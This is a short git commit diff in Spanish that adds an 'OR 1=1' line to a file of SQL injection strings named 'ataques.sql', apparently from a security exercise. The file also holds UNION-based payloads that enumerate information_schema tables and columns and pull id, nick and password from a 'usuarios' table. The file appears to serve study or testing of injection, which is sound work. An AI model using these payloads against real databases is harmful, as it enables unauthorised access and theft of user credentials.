358fa542a520b4bf554cbc11a83a7ec1fd17187e
Víctor Peralta <victorperalta.correo@gmail.com>
2019-11-13 12:39:41 +0100

    añadida sentencia SQL OR 1=1

--- sql/ataques.sql
+++ sql/ataques.sql
@@ -3,3 +3,4 @@ SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT 1,2,3 FROM dual);-- %';
 SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);-- %';
 SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT COLUMN_NAME,2,3 FROM information_schema.columns WHERE TABLE_NAME='usuarios');-- %';
 SELECT ? FROM ? WHERE ? LIKE '%A4' UNION (SELECT id,nick,password FROM usuarios);-- %';
+SELECT ? FROM ? WHERE ? LIKE '%A4' OR 1=1;-- %';
